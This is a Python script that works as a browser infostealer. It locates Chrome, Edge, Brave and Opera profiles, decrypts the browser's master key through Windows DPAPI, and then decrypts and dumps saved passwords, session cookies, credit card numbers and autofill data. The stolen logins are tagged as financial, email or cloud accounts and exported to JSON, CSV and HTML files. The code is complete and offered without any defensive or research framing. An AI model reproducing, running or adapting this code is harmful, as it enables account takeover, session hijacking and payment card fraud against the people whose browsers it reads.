import json, base64, os
try:
    import win32crypt  # type: ignore
except Exception:
    import ctypes
    import ctypes.wintypes as wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
            ("cbData", wintypes.DWORD),
            ("pbData", ctypes.POINTER(ctypes.c_ubyte))
        ]

    def _create_blob(data: bytes):
        buf = ctypes.create_string_buffer(data)
        blob = DATA_BLOB()
        blob.cbData = len(data)
        blob.pbData = ctypes.cast(buf, ctypes.POINTER(ctypes.c_ubyte))
        return blob, buf  # return buf to keep it alive

    def _blob_to_bytes(blob):
        return ctypes.string_at(blob.pbData, blob.cbData)

    def CryptUnprotectData(encrypted, description, pOptionalEntropy, reserved, promptStruct):
        # encrypted: bytes -> returns tuple (description, decrypted_bytes) to match win32crypt.CryptUnprotectData
        blob_in, buf = _create_blob(encrypted)
        blob_out = DATA_BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in),
            None,
            None,
            None,
            None,
            0,
            ctypes.byref(blob_out)
        ) == 0:
            raise ctypes.WinError()
        try:
            out_bytes = _blob_to_bytes(blob_out)
            return (None, out_bytes)
        finally:
            if blob_out.pbData:
                ctypes.windll.kernel32.LocalFree(blob_out.pbData)

    win32crypt = type("win32crypt", (), {"CryptUnprotectData": CryptUnprotectData})
# core/master_key.py — Unified Master Key Resolver
def get_master_key(browser_path):
    local_state_path = os.path.join(browser_path, "Local State")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix

    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

#core/aes_decrypt.py — AES‑GCM Payload Handler
import importlib

# Try to import AES from known module names used by PyCryptodome or forks.
_AES_module = None
for _mod_name in ("Crypto.Cipher", "Cryptodome.Cipher"):
    try:
        _mod = importlib.import_module(_mod_name)
        if hasattr(_mod, "AES"):
            AES = _mod.AES
            _AES_module = _mod_name
            break
    except ImportError:
        continue

if _AES_module is None:
    raise ImportError("PyCryptodome is required (install with 'pip install pycryptodome')")

def decrypt_chromium_value(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return ""

#core/db_utils.py — Safe DB Handling (Avoids Locking)
import shutil, sqlite3

def open_db(path, temp_name="temp.db"):
    shutil.copyfile(path, temp_name)
    return sqlite3.connect(temp_name), temp_name
#extract/passwords.py — Password Dump Module
import os
# use local implementations defined earlier in this file instead of package imports
# from core.master_key import get_master_key
# from core.aes_decrypt import decrypt_chromium_value
# from core.db_utils import open_db

def dump_passwords(browser_path):
    master_key = get_master_key(browser_path)
    db_path = os.path.join(browser_path, "Default", "Login Data")

    conn, temp = open_db(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    results = []
    for url, user, pwd in cursor.fetchall():
        password = decrypt_chromium_value(pwd, master_key)
        results.append({"url": url, "username": user, "password": password})

    conn.close()
    os.remove(temp)
    return results
#extract/cookies.py — Cookie Dump Module
import os
# use local implementations defined earlier in this file instead of package imports
# from core.master_key import get_master_key
# from core.aes_decrypt import decrypt_chromium_value
# from core.db_utils import open_db

def dump_cookies(browser_path):
    master_key = get_master_key(browser_path)
    db_path = os.path.join(browser_path, "Default", "Cookies")

    conn, temp = open_db(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

    cookies = []
    for host, name, val in cursor.fetchall():
        value = decrypt_chromium_value(val, master_key)
        cookies.append({"host": host, "name": name, "value": value})

    conn.close()
    os.remove(temp)
    return cookies

#extract/cards.py — Card Dump Module
import os
# use local implementations defined earlier in this file instead of package imports
# from core.master_key import get_master_key
# from core.aes_decrypt import decrypt_chromium_value
# from core.db_utils import open_db

def dump_cards(browser_path):
    master_key = get_master_key(browser_path)
    db_path = os.path.join(browser_path, "Default", "Web Data")

    conn, temp = open_db(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT name_on_card, encrypted_card_number, expiration_month, expiration_year FROM credit_cards")

    cards = []
    for name, enc_num, mm, yy in cursor.fetchall():
        number = decrypt_chromium_value(enc_num, master_key)
        cards.append({
            "name": name,
            "number": number,
            "month": mm,
            "year": yy
        })

    conn.close()
    os.remove(temp)
    return cards

#extract/autofill.py — Autofill Dump Module
import os
# use local implementation defined earlier in this file instead of package import
# from core.db_utils import open_db

def dump_autofill(browser_path):
    db_path = os.path.join(browser_path, "Default", "Web Data")

    conn, temp = open_db(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT name, value FROM autofill")

    results = []
    for name, value in cursor.fetchall():
        results.append({"field": name, "value": value})

    conn.close()
    os.remove(temp)
    return results

#browser_profiles.py — Locate Chrome, Edge, Brave, Opera
import os

def get_all_browsers():
    base = os.environ["LOCALAPPDATA"]

    browsers = {
        "Chrome": os.path.join(base, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(base, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(base, "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(base, "Opera Software", "Opera Stable")
    }

    return {name: path for name, path in browsers.items() if os.path.isdir(path)}
#import re

def classify_url(url):
    patterns = {
        "Social Media": ["facebook", "twitter", "instagram"],
        "Financial": ["bank", "paypal", "venmo"],
        "Email": ["gmail", "outlook", "yahoo"],
        "Shopping": ["amazon", "ebay"],
        "Cloud": ["aws", "azure", "gcp"]
    }

    for category, kws in patterns.items():
        if any(kw in url.lower() for kw in kws):
            return category
    return "Other"

#Output to CSV, JSON, HTML
import csv

def export_csv(data, filename):
    keys = data[0].keys()
    with open(filename, "w", newline='', encoding="utf-8") as f:
        writer = csv.DictWriter(f, keys)
        writer.writeheader()
        writer.writerows(data)
import json

def export_json(data, filename):
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)
def export_html(data, filename):
    html = "<table border='1'><tr>" + "".join([f"<th>{k}</th>" for k in data[0].keys()]) + "</tr>"
    for row in data:
        html += "<tr>" + "".join([f"<td>{v}</td>" for v in row.values()]) + "</tr>"
    html += "</table>"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(html)
# Use local functions defined above (get_all_browsers, dump_passwords, dump_cookies, dump_cards,
# dump_autofill, export_csv, export_json, export_html, classify_url) — no external imports required.
browsers = get_all_browsers()

for name, path in browsers.items():
    print(f"\n=== {name} ===")

    passwords = dump_passwords(path)
    cookies = dump_cookies(path)
    cards = dump_cards(path)
    autofill = dump_autofill(path)

    # OSINT enrichment
    for entry in passwords:
        entry["category"] = classify_url(entry["url"])

    export_json(passwords, f"{name}_passwords.json")
    export_csv(passwords, f"{name}_passwords.csv")
    export_html(passwords, f"{name}_passwords.html")

    export_json(cookies, f"{name}_cookies.json")
    export_json(cards, f"{name}_cards.json")
    export_json(autofill, f"{name}_autofill.json")

    print(f"Exported all data for {name}.")
